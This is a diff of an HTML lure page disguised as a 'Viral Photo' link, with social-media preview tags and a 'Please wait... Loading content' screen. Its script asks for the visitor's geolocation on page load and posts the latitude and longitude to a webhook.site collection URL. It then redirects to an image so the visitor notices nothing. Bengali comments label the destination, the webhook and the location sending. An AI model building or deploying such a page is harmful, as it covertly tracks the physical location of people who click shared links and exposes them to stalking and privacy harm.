@@ -1,24 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Viral Video 2026</title>
-    <meta property="og:title" content="Viral Video 2026">
-    <meta property="og:description" content="Click to watch the full video">
-    <meta property="og:image" content="https://i.postimg.cc/k5fL7S98/In-Shot-20260305-184518450.jpg">
-    <meta property="og:image:type" content="image/jpeg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="video.other">
+    <meta charset="UTF-8">
+    <title>Viral Photo 2026</title>
+    <meta property="og:title" content="Check this amazing photo!">
+    <meta property="og:description" content="Click to view the full photo">
+    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
+    <meta property="og:type" content="website">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="text-align:center;"><p>Please wait, loading...</p></div>
+<body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:white;font-family:sans-serif;">
+    <div style="text-align:center;">
+        <h2>Please wait...</h2>
+        <p>Loading content...</p>
+    </div>
+
     <script>
-        const targetURL = "https://postimg.cc/3k09KZXR";
+        // আপনার কাঙ্ক্ষিত গন্তব্য (Target URL)
+        const targetURL = "https://postimg.cc/3k09KZXR"; 
+        // আপনার Webhook লিঙ্ক
         const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
 
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
+                    // লোকেশন ডাটা পাঠানো হচ্ছে
                     fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
                         body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude}) 
                     }).then(() => { window.location.href = targetURL; });
